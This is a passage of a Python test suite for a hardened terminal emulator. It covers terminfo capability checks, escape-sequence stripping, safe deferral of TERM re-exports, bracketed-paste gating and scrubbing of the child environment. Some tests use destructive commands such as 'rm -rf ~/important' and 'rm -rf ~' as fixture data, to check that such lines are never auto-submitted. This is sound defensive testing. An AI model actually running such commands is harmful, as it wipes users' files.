    """name -> expanded escape string, for every STRING capability the compiled
    `entry` advertises."""
    env = dict(os.environ, TERMINFO=_tdir, TERM=entry)
    out = _sp.run(['infocmp', '-1', '-x', entry], env=env, check=True,
                  capture_output=True, text=True, timeout=15).stdout
    caps = {}
    for line in out.splitlines():
        line = line.strip().rstrip(',')
        if line.startswith('#') or '=' not in line:
            continue
        name, _, value = line.partition('=')
        nparams = 0
        for n in ('1', '2', '3', '4', '5', '6', '7', '8', '9'):
            if '%p' + n in value:
                nparams = max(nparams, int(n))
        args = [name] + ['1'] * nparams
        got = _sp.run(['tput', '-T', entry] + args, env=env, check=False,
                      capture_output=True, timeout=15)
        if got.returncode == 0 and got.stdout:
            caps[name] = got.stdout.decode('latin-1')
    return caps


def _renders_to(text, line_edits):
    """What the CLI cell model puts on screen for `text`."""
    comp, cells, _col, _sgr, wraps = _fle([], 0, {}, text, 0, line_edits)
    runs, _p = _c2r(comp, cells, 'detail', False, wraps=wraps)
    return ''.join(t for t, _k in runs)


_CAPS_EDIT = _entry_caps('secure-terminal')
_CAPS_NOEDIT = _entry_caps('secure-terminal-noedit')
ok(len(_CAPS_EDIT) > 20 and len(_CAPS_NOEDIT) > 20,
   'the compiled entries enumerate their capabilities')

# 1. No surviving capability may expand to an OSC or DCS introducer. Every OSC
# feature is neutralized by default and DCS is always stripped, so advertising
# one promises a side effect that is dropped on the floor (Cs/Cr were OSC 12/112
# cursor colour; xr was the DCS xterm version query).
for _entry, _caps in (('secure-terminal', _CAPS_EDIT),
                      ('secure-terminal-noedit', _CAPS_NOEDIT)):
    _osc = sorted(n for n, v in _caps.items() if '\x1b]' in v or '\x1bP' in v)
    eq(_osc, [], '%s advertises no OSC/DCS capability' % _entry)

# 2. Every advertised capability that emits an ESCAPE must be CONSUMED whole --
# it may move the cursor or set a colour, but it must leak no BODY glyph on
# screen. A capability the stripper does not match leaks its body as unmarked
# text, which is how the charset designators (smacs=ESC ( 0, and ESC ( B from
# every sgr0) used to print "(0" / "(B".
# The forward/absolute cursor moves (cuf/cuf1/hpa) are the one legitimate
# render: like a real VT they blank-pad the skipped columns, so from the
# append-only margin they leave trailing SPACES (never the escape body). Strip
# spaces before the leak check -- a leaked body always carries a non-space byte
# (a letter, digit or a marked box for a surviving ESC), so this still catches
# every real leak while allowing the honest pad.
# k* capabilities are the INPUT side (bytes the terminal sends when a key is
# pressed), never program output, so they are not the renderer's to consume.
for _entry, _caps, _le in (('secure-terminal', _CAPS_EDIT, True),
                           ('secure-terminal-noedit', _CAPS_NOEDIT, False)):
    _leaky = sorted(n for n, v in _caps.items()
                    if not n.startswith('k') and '\x1b' in v
                    and _renders_to(v, _le).strip(' ') != '')
    eq(_leaky, [], '%s: every escape-emitting capability leaks no body glyph' % _entry)

# 3. The two-way lock between the cursor/erase family and the renderer. An
# advertised op MUST be honoured (or the shell's redraw silently does nothing);
# a cancelled op MUST NOT be (or line_edits=false is append-only in name only).
# Both directions matter: this is the clash the -noedit entry exists to prevent.
# cap -> (its escape, a probe whose render CHANGES when the op is honoured).
# The forward moves (cuf/cuf1) and erase-to-EOL (el) must first move the cursor OFF
# the append-only margin, or with no line width they clamp to end-of-line and prove
# nothing. That pre-positioning uses BACKSPACE (cub1 = \b), which is honoured in BOTH
# settings -- NOT a CSI cub/hpa move, which noedit cancels: were the setup itself
# cancelled, the probe could never leave the margin and a real "noedit still honours
# cuf/el" regression would pass undetected. cub/hpa/el1 are self-contained (the tested
# op is also the only move), so they need no separate setup.
_CURSOR_FAMILY = {
    'cuf': ('\x1b[2C', 'abcdef\b\b\b\b\x1b[2CX'),
    'cuf1': ('\x1b[C', 'abcdef\b\b\b\b\x1b[CX'),
    'cub': ('\x1b[2D', 'abc\x1b[2DX'),
    'hpa': ('\x1b[2G', 'abc\x1b[2GX'),
    'el': ('\x1b[K', 'abcdef\b\b\b\x1b[K'),
    'el1': ('\x1b[1K', 'abc\x1b[1K'),
}
for _entry, _caps, _le in (('secure-terminal', _CAPS_EDIT, True),
                           ('secure-terminal-noedit', _CAPS_NOEDIT, False)):
    for _cap, (_esc, _probe) in _CURSOR_FAMILY.items():
        _acted = _renders_to(_probe, _le) != _renders_to(
            _probe.replace(_esc, ''), _le)
        eq(_acted, _cap in _caps,
           '%s: %s is honoured by the renderer exactly when advertised'
           % (_entry, _cap))

# cub1 is \b -- a raw control byte, honoured in BOTH settings, so it must stay
# advertised in both. (Cancelling it would over-restrict; keeping it while the
# renderer ignored it would be the same clash in reverse.)
for _entry, _caps, _le in (('secure-terminal', _CAPS_EDIT, True),
                           ('secure-terminal-noedit', _CAPS_NOEDIT, False)):
    ok('cub1' in _caps, '%s advertises cub1 (backspace)' % _entry)
    eq(_renders_to('abc\bX', _le), 'abX',
       '%s honours backspace whatever line_edits says' % _entry)

# 4. The -noedit entry may only ever be a SUBSET: it exists to cancel caps, so a
# capability it advertises that the full entry does not is drift, not intent.
eq(sorted(set(_CAPS_NOEDIT) - set(_CAPS_EDIT)), [],
   'the append-only entry advertises nothing the full entry does not')

# 5. CLASH between the shipped source and the COMPILED artifact: cli_terminfo_dir
# caches the compilation, so a cache that outlives a changed .ti keeps advertising
# the old capability set to every shell -- the renderer moves on, the promise does
# not. (Found the hard way: a cache predating the -noedit entry made this very
# audit read a capability set that no longer existed in the source.)
# Isolated cache: the probe writes a BOGUS compiled entry, which must never be
# left where a later test (or a real shell) could read it as terminfo.
import tempfile as _tf                                              # noqa: E402
import shutil as _shutil                                            # noqa: E402
_prev_cache = os.environ.get('XDG_CACHE_HOME')
_tmpcache = _tf.mkdtemp(prefix='st-terminfo-')
os.environ['XDG_CACHE_HOME'] = _tmpcache
_stale = os.path.join(_tmpcache, 'secure-terminal', 'terminfo')
os.makedirs(os.path.join(_stale, 's'), exist_ok=True)
_stale_file = os.path.join(_stale, 's', 'secure-terminal')
# BOTH entries are written, so the cache is complete and only its AGE can reject
# it -- otherwise this would re-test the both-entries rule and never reach the
# mtime comparison at all.
_stale_files = [_stale_file, os.path.join(_stale, 's', 'secure-terminal-noedit')]


def _write_stale(offset):
    for _p in _stale_files:
        with open(_p, 'wb') as _fh:
            _fh.write(b'stale')
        os.utime(_p, (os.path.getmtime(_ti) + offset,
                      os.path.getmtime(_ti) + offset))


_write_stale(-60)
_got_dir = _timod.cli_terminfo_dir()
ok(_got_dir is not None, 'a stale cache still yields a terminfo dir')
with open(os.path.join(_got_dir, 's', 'secure-terminal'), 'rb') as _sfh:
    _compiled = _sfh.read()
ok(_compiled != b'stale',
   'a compiled entry older than the .ti source is RECOMPILED, not served stale')
# the recompilation is a real, complete one: BOTH entries resolve from it
eq(_sp.run(['tput', '-T', 'secure-terminal-noedit', 'cub1'],
           env=dict(os.environ, TERMINFO=_got_dir), check=False,
           capture_output=True, timeout=15).returncode, 0,
   'the refreshed compilation carries the append-only entry too')
# ...and a cache NEWER than the source is served as-is (no needless recompile)
_write_stale(+60)
## C5: Recompile check tests the file bytes are unchanged, not the path
with open(_stale_file, 'rb') as _bf:
    _before_bytes = _bf.read()
_timod.cli_terminfo_dir()
with open(_stale_file, 'rb') as _bf:
    _after_bytes = _bf.read()
eq(_before_bytes, _after_bytes,
   'a compiled entry newer than the source is served from cache')
if _prev_cache is None:
    del os.environ['XDG_CACHE_HOME']
else:
    os.environ['XDG_CACHE_HOME'] = _prev_cache
_shutil.rmtree(_tmpcache, ignore_errors=True)
# end-to-end: a CLI-mode child actually sees TERM=secure-terminal
## C3: Read until a full line/record (newline) is present to prevent split-read truncation flake
_te = SecureTerminal(command=['sh', '-c', 'printf T=$TERM\\n'])
_ebuf = b''
_estart = _time.monotonic()
import fcntl as _fcntl2                                             # noqa: E402
_fcntl2.fcntl(_te._fd, _fcntl2.F_SETFL,
              _fcntl2.fcntl(_te._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
while _time.monotonic() - _estart < 1.5:
    import select as _sel2
    _r, _selw, _selx = _sel2.select([_te._fd], [], [], 0.05)
    if _te._fd in _r:
        try:
            _chunk = os.read(_te._fd, 4096)
        except OSError:
            break
        if not _chunk:
            break
        _ebuf += _chunk
        if b'T=' in _ebuf and b'\n' in _ebuf:
            break
_te.close()
ok(b'T=secure-terminal' in _ebuf, 'the child process actually gets TERM=secure-terminal')


def _child_term_env(term):
    """Read back what the child's TERM actually was. The ctor FORKS, so this is the
    only assertion that catches a line_edits value applied too late -- _child_term()
    is evaluated lazily and would report the post-fork value either way."""
    buf = b''
    _fcntl2.fcntl(term._fd, _fcntl2.F_SETFL,
                  _fcntl2.fcntl(term._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
    import select as _sel3                                          # noqa: E402
    start = _time.monotonic()
    while _time.monotonic() - start < 1.5:
        _r, _, _ = _sel3.select([term._fd], [], [], 0.05)
        if term._fd not in _r:
            continue
        try:
            chunk = os.read(term._fd, 4096)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if b'T=' in buf and b'\n' in buf:
            break
    return buf


# The window's line_edits default must reach the CTOR, which is what forks: applied
# afterwards via apply_line_edits it leaves the already-forked shell advertising
# el/cuf/hpa, so the opt-out changed only the display and completion still garbled.
_saved_dle = win._default_line_edits
_probe_cmd = ['sh', '-c', 'printf T=$TERM\\n']
win._default_line_edits = False
win.new_tab(command=_probe_cmd)
ok(b'T=secure-terminal-noedit' in _child_term_env(win.current()),
   'new_tab forks the child with the append-only terminfo entry')
win._default_line_edits = True
win.new_tab(command=_probe_cmd)
_dfl_term = _child_term_env(win.current())
ok(b'T=secure-terminal' in _dfl_term and b'-noedit' not in _dfl_term,
   'line editing on (the default) forks with the normal CLI entry')
win._default_line_edits = _saved_dle
# a --no-line-edits launch spec must reach the ctor for the same reason
win._open_launch_tab({'command': _probe_cmd, 'line_edits': False})
ok(b'T=secure-terminal-noedit' in _child_term_env(win.current()),
   'a --no-line-edits launch spec forks the child with the append-only entry')

# CLI<->TUI toggle re-exports TERM for the new mode into the RUNNING shell (no
# restart, state preserved), and is REFUSED with an advisory while a program owns
# the terminal -- its terminfo cannot be changed under it (#63). command=None: the
# re-export only fires for the DEFAULT login shell, so this needs a shell tab.
_tg = SecureTerminal(command=None)
_tgadv: list[str] = []
_tg.advise_signal.connect(_tgadv.append)
_tgsent = spy_writes(_tg)
_tg.has_foreground_program = lambda: True             # a program is running
ok(_tg.apply_tui(True) is False and _tg._tui is False,
   'apply_tui is refused while a program is running')
ok(any('shell prompt' in a for a in _tgadv),
   'the refusal advises switching at a shell prompt')
ok(_tgsent == [], 'a refused switch writes nothing to the shell')
_tg.has_foreground_program = lambda: False            # at a prompt now
ok(_tg.apply_tui(True) is True and _tg._tui is True,
   'apply_tui switches to TUI at a shell prompt')
# CR (\r), not \n: zsh's zle binds accept-line to CR, so \n would leave the
# re-export unsubmitted at the prompt (regression: TUI->CLI "not auto sent").
ok(b'export TERM=xterm-256color\r' in _tgsent,
   'CLI->TUI re-exports the full terminfo to the running shell, CR-terminated')
ok(not any(b'export TERM=xterm-256color\n' in s for s in _tgsent),
   'the re-export is NOT \\n-terminated (would not submit under zle)')
_tgsent.clear()
_tg.apply_tui(False)
ok(b'export TERM=secure-terminal\r' in _tgsent,
   'TUI->CLI re-exports the restricted terminfo to the running shell, CR-terminated')
_tg.close()

# A tab launched with `-- PROGRAM` runs that program as _pid, which
# has_foreground_program cannot tell from a bare shell, so the re-export is SKIPPED
# there -- else `export TERM=...` would be typed into the program (ai-review P1).
_tgc = SecureTerminal(command='/bin/cat')
_tgcsent = spy_writes(_tgc)
_tgc.has_foreground_program = lambda: False            # looks like "a prompt"
ok(_tgc.apply_tui(True) is True and _tgc._tui is True,
   'apply_tui still switches mode for a command tab')
ok(not any(b'export TERM=' in s for s in _tgcsent),
   'a command tab (command != None) never re-exports TERM into the program')
_tgc.close()

# --- a pending line DEFERS the re-export (pty injection) -----------------------
# `export TERM=...` is TYPED INPUT terminated by CR, so sending it while the user
# has a half-typed line makes the shell receive `<pending>export TERM=...` and RUN
# it -- an Enter nobody pressed, submitting their unfinished text. Verified against
# a real bash on a real pty: a pending `echo mark$((6*7))` came back as
# `mark42 export TERM=xterm-256color`. So: hold the re-export until the prompt is
# clear -- and never kill the line to make room, because discarding what someone
# typed is not ours to do.
_tgp = SecureTerminal(command=None)
_tgpadv: list[str] = []
_tgp.advise_signal.connect(_tgpadv.append)
_tgpsent = spy_writes(_tgp)
_tgp.has_foreground_program = lambda: False            # at a shell prompt
_tgp._line_buffer = 'rm -rf ~/important'               # half-typed, no Enter yet
ok(_tgp.apply_tui(True) is True and _tgp._tui is True,
   'the display still switches while a line is pending')
ok(_tgpsent == [],
   'a pending line defers the re-export: nothing is typed into the shell')
ok(not any(b'\r' in s for s in _tgpsent),
   'no accept-line reaches the shell, so the pending line is never force-submitted')
eq(_tgp._line_buffer, 'rm -rf ~/important',
   'the half-typed line is left intact (never killed to make room)')
ok(any('submitted or cleared' in a for a in _tgpadv),
   'the deferral is advised, not silent')
# It must still LAND once the prompt clears, or the live switch is merely broken.
# The terminal is in TUI mode now, where the line is not mirrored -- the accept-line
# keys still have to release the deferral, else it would wait forever.
key(_tgp, Qt.Key.Key_Return)                           # submits, clearing the prompt
ok(_tgp._line_buffer == '' and not _tgp._line_dirty,
   'accept-line in TUI mode releases the deferred re-export')
_tgpsent.clear()                                       # drop the CR itself
feed_output(_tgp, b'prompt$ ')                         # a returning prompt is the cue
ok(any(b'export TERM=xterm-256color\r' == s for s in _tgpsent),
   'the deferred re-export is sent once the line is clear')
ok(not getattr(_tgp, '_reexport_pending', False),
   'the deferral is cleared after it is sent')
_tgp.close()

# The same hazard with an INVISIBLE line: a history recall (Up) rewrites the real
# shell line without going through _line_buffer, so the buffer reads empty while
# the prompt is actually full. _line_dirty is what records "we cannot see this
# line" -- a line we cannot see is exactly the line a CR-terminated re-export must
# not be typed into.
_tgd = SecureTerminal(command=None)
_tgdsent = spy_writes(_tgd)
_tgd.has_foreground_program = lambda: False
key(_tgd, Qt.Key.Key_Up)                               # recall a previous command
ok(_tgd._line_dirty and _tgd._line_buffer == '',
   'history recall marks the line unmirrored')
_tgdsent.clear()                                       # drop the arrow sequence
_tgd.apply_tui(True)
ok(_tgdsent == [],
   'a recalled (unmirrored) line defers the re-export too')
_tgd.close()

# The same hazard reached from TUImode. TUI never mirrors the shell's line, so
# text typed at a BARE prompt (no foreground program) touches neither _line_buffer
# nor -- until now -- _line_dirty. Left unflagged, a TUI->CLI switch fired an
# immediate CR-terminated re-export that concatenated onto and SUBMITTED that
# typed line: an Enter nobody pressed. So a TUI keystroke at a bare prompt marks
# the line dirty, and the switch defers exactly like a mirrored CLI line.
_tt = SecureTerminal(command=None, tui=True)
_ttsent = spy_writes(_tt)
_tt.has_foreground_program = lambda: False              # bare shell prompt
key(_tt, Qt.Key.Key_L, 'l')                             # type `ls` at the TUI prompt
key(_tt, Qt.Key.Key_S, 's')
ok(_tt._line_dirty and _tt._line_buffer == '',
   'typing at a bare TUI prompt marks the line dirty (the buffer stays unmirrored)')
ok(_tt._line_pending(),
   '_line_pending() sees the TUI-typed line, so a re-export must wait for it')
_ttsent.clear()
_tt.apply_tui(False)                                    # flip TUI -> CLI
ok(_ttsent == [],
   'the TUI-typed line defers the re-export: nothing is typed into the shell')
ok(not any(b'\r' in s for s in _ttsent),
   'no CR is generated, so the typed line is never force-submitted')
# It must still LAND once the prompt clears, or the switch is merely broken. The
# tab is in CLI mode now; submitting the line releases the deferral.
key(_tt, Qt.Key.Key_Return)                             # user submits -> prompt clears
_ttsent.clear()                                         # drop the CR itself
feed_output(_tt, b'prompt$ ')                           # a returning prompt is the cue
ok(any(b'export TERM=secure-terminal\r' == s for s in _ttsent),
   'the deferred re-export lands once the TUI-typed line is submitted')
_tt.close()

# A history recall (Up) at a bare TUI prompt is the same hazard with an INVISIBLE
# line -- it marks dirty too (covers the mapped-key path, not just printable text).
_thh = SecureTerminal(command=None, tui=True)
spy_writes(_thh)                                        # sink the writes; not inspected
_thh.has_foreground_program = lambda: False
key(_thh, Qt.Key.Key_Up)                                # recall a previous command
ok(_thh._line_dirty,
   'history recall at a bare TUI prompt marks the line unmirrored')
_thh.close()

# But keys consumed by a FOREGROUND PROGRAM must NOT mark the line: a program that
# exits without an accept-line key (e.g. `less` quit with `q`) would otherwise
# strand the flag and defer the re-export forever.
_tp = SecureTerminal(command=None, tui=True)
_tpsent = spy_writes(_tp)
_tp.has_foreground_program = lambda: True               # a full-screen program owns it
_tp._line_dirty = False
key(_tp, Qt.Key.Key_Q, 'q')                             # e.g. `q` to quit less
ok(not _tp._line_dirty,
   'a keystroke into a running program does not mark the line (no stranded defer)')
# and because it was never stranded, once the program exits the switch re-exports
# immediately instead of deferring on a phantom pending line.
_tp.has_foreground_program = lambda: False              # program exited -> bare prompt
_tp.apply_tui(False)
ok(any(b'export TERM=secure-terminal\r' == s for s in _tpsent),
   'once the program exits, the switch re-exports immediately (nothing stranded)')
_tp.close()

# A bare shell prompt in TUI mode still submits real commands: switching to TUI,
# typing a command, and pressing Enter has to submit and settle the line. An empty
# prompt submits with nothing to reset; a program owning the terminal receives the
# accept-line directly.
_thk = SecureTerminal(command=None, tui=True)
_thksent = spy_writes(_thk)
_thk.has_foreground_program = lambda: False
_thk._line_dirty = False
_thk._line_buffer = ''
key(_thk, Qt.Key.Key_Return)
ok(b'\r' in _thksent,
   'an empty TUI prompt submits normally on accept-line')
# while a foreground program owns the terminal, accept-line goes to IT
_thksent.clear()
_thk.has_foreground_program = lambda: True
key(_thk, Qt.Key.Key_Return)
ok(b'\r' in _thksent,
   'a program owning the terminal receives accept-line directly')
_thk.close()

# A paste at a bare TUI shell prompt is a command the next Enter submits, so it must
# mark the line unverifiable too, keeping _line_pending() aware the prompt is held.
_tpp = SecureTerminal(command=None, tui=True)
spy_writes(_tpp)
_tpp.has_foreground_program = lambda: False
_tpp._line_dirty = False
_tpp._dispatch_paste('rm -rf ~', 'unicode')             # paste at a bare TUI prompt
ok(_tpp._line_dirty,
   'a paste at a bare TUI prompt marks the line unverifiable')
_tpp.has_foreground_program = lambda: True               # a program owns the terminal
_tpp._line_dirty = False
_tpp._dispatch_paste('data', 'unicode')                  # paste is the program's data
ok(not _tpp._line_dirty,
   'a paste delivered to a foreground TUI program does not mark the line')
_tpp.close()

# stale bracketed-paste bit (DEC 2004): a foreground program enables bracketed paste then
# dies WITHOUT disabling it (crash / kill -9 / dropped SSH); the sticky pyte bit must not
# keep _bracketed_paste_active() True for the RETURNING SHELL, or a multiline paste would
# be framed (200~/201~) and its embedded \r auto-run past the paste gate. Two defenses:
# the read path drops the stale bit on the foreground-program True->False edge, AND the
# gate requires a LIVE foreground program to OWN the bit (so a bit that latched without an
# observed edge is still not trusted).
_bpm = 2004 << 5
_bp = SecureTerminal(command=None, tui=True)
_bp.has_foreground_program = lambda: True                 # a program owns the terminal
feed_output(_bp, b'\x1b[?2004h')                          # ...and turns bracketed paste on
ok(_bpm in _bp._screen.mode and _bp._bracketed_paste_active(),
   'bracketed paste is active while a live foreground program holds DEC 2004')
_bp.has_foreground_program = lambda: False                # the program dies (no ?2004l)
feed_output(_bp, b'user@host:~$ ')                        # the returning shell prompt
ok(_bpm not in _bp._screen.mode,
   'the stale DEC 2004 bit is dropped when the foreground program exits (edge clear)')
ok(not _bp._bracketed_paste_active(),
   'bracketed paste is NOT trusted for the returning shell (a multiline paste is reviewed)')
_bp.close()

# single-read TOCTOU: a program's ?2004h and its death can COALESCE into one os.read()
# (kill -9), so has_foreground_program is already False when the bit latches and the
# read-path edge never fires. The gate's live-foreground requirement still refuses to
# trust the latched-but-unowned bit -- closing the window the edge-clear alone cannot.
_bp2 = SecureTerminal(command=None, tui=True)
_bp2.has_foreground_program = lambda: False               # the program is already gone
feed_output(_bp2, b'\x1b[?2004h')                         # its ?2004h latches anyway
ok(_bpm in _bp2._screen.mode,
   'the 2004 bit latches even when the arming program is already gone (single read)')
ok(not _bp2._bracketed_paste_active(),
   'a latched 2004 bit with no live foreground program is NOT trusted (TOCTOU closed)')
_bp2.close()

# A CLI-typed line carried into TUI stays in _line_buffer; editing it there with a
# key TUI cannot mirror (Backspace/Home/Delete) desyncs the buffer from the real
# shell line, so it must invalidate the buffer -- keeping _line_pending() honest so
# a CR-terminated re-export is not typed onto the edited line.
_tce = SecureTerminal(command=None, tui=True)
spy_writes(_tce)
_tce.has_foreground_program = lambda: False
_tce._line_buffer = '#rm -rf ~'                          # carried CLI line, commented
_tce._line_dirty = False
key(_tce, Qt.Key.Key_Backspace)                          # edit it in TUI (delete the #)
ok(_tce._line_dirty,
   'a TUI edit of a carried CLI line invalidates the stale buffer')
_tce.close()

# A no-op key at an EMPTY bare TUI prompt introduces no content, so it must NOT
# flag the line pending -- else the TUI->CLI switch would needlessly defer the
# re-export at a clean prompt, leaving TERM stale for the next command. Pure
# navigation (Left/Home/...) and deletion (Backspace/Delete) can only ACT on
# content a content-introducing key already flagged.
_tn = SecureTerminal(command=None, tui=True)
_tnsent = spy_writes(_tn)
_tn.has_foreground_program = lambda: False
key(_tn, Qt.Key.Key_Backspace)                          # no-op at an empty prompt
key(_tn, Qt.Key.Key_Left)                               # pure cursor move
ok(not _tn._line_dirty and not _tn._line_pending(),
   'navigation/deletion at an empty TUI prompt does not flag the line pending')
_tnsent.clear()
_tn.apply_tui(False)                                    # flip TUI -> CLI
ok(any(b'export TERM=secure-terminal\r' == s for s in _tnsent),
   'a clean prompt re-exports immediately -- no needless deferral for no-op keys')
_tn.close()

# The discard branch requires `not shift`, matching the control-byte branch below
# it: Ctrl+Shift+C is a copy shortcut, not a discard, so it must NOT clear the line.
# (The window filters Ctrl+Shift before _tui_key; this keeps the two branches self-
# consistent, so a clear can never fire without the matching byte being sent.)
_ts = SecureTerminal(command=None, tui=True)
spy_writes(_ts)
_ts.has_foreground_program = lambda: False
_ts._line_buffer = 'held'
_ts._tui_key(QKeyEvent(QEvent.Type.KeyPress, Qt.Key.Key_C,
                       Qt.KeyboardModifier.ControlModifier
                       | Qt.KeyboardModifier.ShiftModifier, ''))
ok(_ts._line_buffer == 'held',
   'Ctrl+Shift+C does not clear the line in _tui_key (it is not a discard)')
_ts.close()

# Toggling line editing live must re-export TERM too, not only re-render: the
# renderer stops honouring el/cuf/hpa, so a shell still told they work keeps
# emitting redraws that vanish (a mangled completion). Same reachability guard as
# the CLI/TUI switch.
_lex = SecureTerminal(command=None)
_lexadv: list[str] = []
_lex.advise_signal.connect(_lexadv.append)
_lexsent = spy_writes(_lex)
_lex.has_foreground_program = lambda: False           # at a shell prompt
_lex.apply_line_edits(False)
ok(b'export TERM=secure-terminal-noedit\r' in _lexsent,
   'line editing off re-exports the append-only terminfo entry, CR-terminated')
_lexsent.clear()
_lex.apply_line_edits(True)
ok(b'export TERM=secure-terminal\r' in _lexsent,
   'line editing back on re-exports the normal CLI terminfo entry')
_lexsent.clear()
_lex.has_foreground_program = lambda: True            # a program owns the terminal
_lex.apply_line_edits(False)
ok(_lex.line_edits_enabled() is False,
   'the display change still applies while a program is running')
ok(_lexsent == [], 'no export is typed into a running program')
ok(any('shell prompt' in a for a in _lexadv),
   'the unreachable re-export is advised, not silent')
_lex.close()

# TUI advertises xterm-256color either way, so a line-edits toggle there must not
# write a pointless export into the shell.
_lext = SecureTerminal(command=None, tui=True)
_lextsent = spy_writes(_lext)
_lext.has_foreground_program = lambda: False
_lext.apply_line_edits(False)
ok(_lextsent == [], 'a line-edits toggle in TUI mode re-exports nothing')
_lext.close()


# #93: has_foreground_program / terminate distinguish a LOGIN shell's bare prompt
# (its child IS the shell -> nothing to terminate) from a `-- PROGRAM` tab (its
# child IS the program -- nano, htop -- to terminate). Force "the child is in the
# foreground" (fg pgrp == _pid) and flip _command to read it both ways, so one
# lightweight tab exercises all four branches deterministically.
import os as _os93                                       # noqa: E402
_fgt = SecureTerminal(command='/bin/cat')                # command tab: _command set
# pty.fork() runs the child's setsid() asynchronously; until it completes the
# child briefly shares OUR process group, which terminate's self-kill guard
# (correctly) refuses to signal. A real user never terminates in that microsecond
# window -- wait for the child to settle into its own session before probing.
for _ in range(200):
    try:
        if _os93.getpgid(_fgt._pid) != _os93.getpgrp():
            break
    except OSError:
        break
    pump(10)
_fgt._foreground_pgrp = lambda: _os93.getpgid(_fgt._pid)
ok(_fgt.has_foreground_program(),
   '#93: a `-- PROGRAM` tab whose program is in the foreground is terminable')
_fgt._command = None                                     # read as a login shell at its prompt
ok(not _fgt.has_foreground_program(),
   '#93: a login shell at its bare prompt is not terminable')
ok(not _fgt.terminate_foreground(),
   '#93: terminate is a no-op at a login-shell bare prompt')
_fgt._command = '/bin/cat'                               # a command tab again
ok(_fgt.terminate_foreground(), '#93: terminate acts on a command-tab program')
_fgt.close()

# #93 (ai-review F5): getpgid races the child's death -- if the child exits between
# the enable-poll and the click, terminate_foreground must treat it as gone (no-op),
# not raise ProcessLookupError out of the slot (as has_foreground_program does).
_ogpg93 = _os93.getpgid
_os93.getpgid = lambda _p: (_ for _ in ()).throw(ProcessLookupError())  # type: ignore[assignment]
try:
    _fgd = SecureTerminal(command='/bin/cat')
    _fgd._command = None
    _fgd._pid = 999999
    _fgd._foreground_pgrp = lambda: 424242          # non-None, not our own group
    ok(not _fgd.terminate_foreground(),
       '#93: terminate is a no-op when getpgid races the child death (no exception)')
    _fgd.close()
finally:
    _os93.getpgid = _ogpg93

# --- truecolour / 256-colour rendering (CLI line mode) ------------------------
_tc = SecureTerminal(command='/bin/cat')
eq(_tc._format_for({'fg': '#ff6400', 'bg': None, 'bold': False}).foreground().color().name(),
   '#ff6400', 'CLI renders a 24-bit truecolour fg')
ok(_tc._format_for({'fg': 3, 'bg': None, 'bold': False}).foreground().color().isValid(),
   'CLI still renders a 16-colour palette fg')
ok(_tc._format_for({'fg': '#123456', 'bg': '#123456', 'bold': False})
   .foreground().color().name() != '#123456',
   'the contrast guard forces a readable fg even when a truecolour fg == bg')
# a STRUCTURAL block/half-block glyph keeps BOTH its truecolour fg and bg: the readability
# guard is skipped for it, because its deliberately near-equal fg/bg are the two pixels of a
# colour ramp, not hidden text. Without this a half-block gradient renders banded (bg dropped).
_bfmt = _tc._format_for({'fg': '#c0c0c0', 'bg': '#b4b4b4', 'bold': False}, structural=True)
eq(_bfmt.background().color().name(), '#b4b4b4',
   'a structural glyph keeps its truecolour bg (contrast guard skipped)')
eq(_bfmt.foreground().color().name(), '#c0c0c0',
   'a structural glyph keeps its truecolour fg (contrast guard skipped)')
ok(_tc._format_for({'fg': '#c0c0c0', 'bg': '#b4b4b4', 'bold': False})
   .foreground().color().name() != '#c0c0c0',
   'the contrast guard STILL fires for a non-structural near-equal fg/bg')
_tc.close()
# a child sees COLORTERM=truecolor (we render it faithfully, so we advertise it)
_cte = SecureTerminal(command=['sh', '-c', 'printf C=$COLORTERM,CTEND'])
_cbuf = b''
_cs = _time.monotonic()
_fcntl2.fcntl(_cte._fd, _fcntl2.F_SETFL,
              _fcntl2.fcntl(_cte._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
while _time.monotonic() - _cs < 1.5:
    import select as _sel3
    _rr, _selw3, _selx3 = _sel3.select([_cte._fd], [], [], 0.05)
    if _cte._fd in _rr:
        try:
            _ck = os.read(_cte._fd, 4096)
        except OSError:
            break
        if not _ck:
            break
        _cbuf += _ck
        if b'CTEND' in _cbuf:              # distinct terminator, not the C= prefix
            break
_cte.close()
ok(b'C=truecolor' in _cbuf, 'the child gets COLORTERM=truecolor')


# --- child environment scrub (fingerprint vars, LINES/COLUMNS, PAGER default) --
def _child_env_out(cmd, needle, secs=1.5):
    """Spawn a CLI child running `cmd`, read its raw output until `needle` (bytes)
    or `secs` elapse, return the bytes -- asserts what the child actually inherits."""
    import select as _selce
    _t = SecureTerminal(command=cmd)
    _fcntl2.fcntl(_t._fd, _fcntl2.F_SETFL,
                  _fcntl2.fcntl(_t._fd, _fcntl2.F_GETFL) | os.O_NONBLOCK)
    _b = b''
    _s = _time.monotonic()
    while _time.monotonic() - _s < secs:
        _rr, _, _ = _selce.select([_t._fd], [], [], 0.05)
        if _t._fd in _rr:
            try:
                _c = os.read(_t._fd, 4096)
            except OSError:
                break
            if not _c:
                break
            _b += _c
            if needle in _b:
                break
    _t.close()
    return _b


# preload every fingerprint var terminal.py drops + a stale LINES/COLUMNS, so any
# leak is visible in the child's `env`
_fp_vars = ('TERM_PROGRAM', 'TERM_PROGRAM_VERSION', 'VTE_VERSION',
            'KONSOLE_VERSION', 'KONSOLE_DBUS_SERVICE', 'KONSOLE_DBUS_SESSION',
            'WT_SESSION', 'WT_PROFILE_ID', 'ITERM_SESSION_ID', 'ITERM_PROFILE',
            'KITTY_WINDOW_ID', 'KITTY_PID', 'ALACRITTY_WINDOW_ID')
for _fv in _fp_vars:
    os.environ[_fv] = 'leak-' + _fv
os.environ['LINES'] = '99'
os.environ['COLUMNS'] = '222'
# leading newline so a first-line var is matched by the "\nNAME=" test too
_envout = b'\n' + _child_env_out(['sh', '-c', 'env; printf ENVEND'], b'ENVEND')
for _fv in _fp_vars:
    ok(('\n' + _fv + '=').encode() not in _envout,
       'child does not inherit fingerprint var ' + _fv)
ok(b'\nLINES=' not in _envout,
   'child does not inherit a stale LINES (real size comes from TIOCSWINSZ)')
ok(b'\nCOLUMNS=' not in _envout, 'child does not inherit a stale COLUMNS')
for _fv in _fp_vars + ('LINES', 'COLUMNS'):
    os.environ.pop(_fv, None)
# PAGER defaults to cat when the parent set none; a distinct terminator (not the
# P= prefix of the expected value) so a split read cannot break the loop early
os.environ.pop('PAGER', None)
_pgr = _child_env_out(['sh', '-c', 'printf P=$PAGER,PGREND'], b'PGREND')
ok(b'P=cat,' in _pgr, 'the child gets PAGER=cat by default')

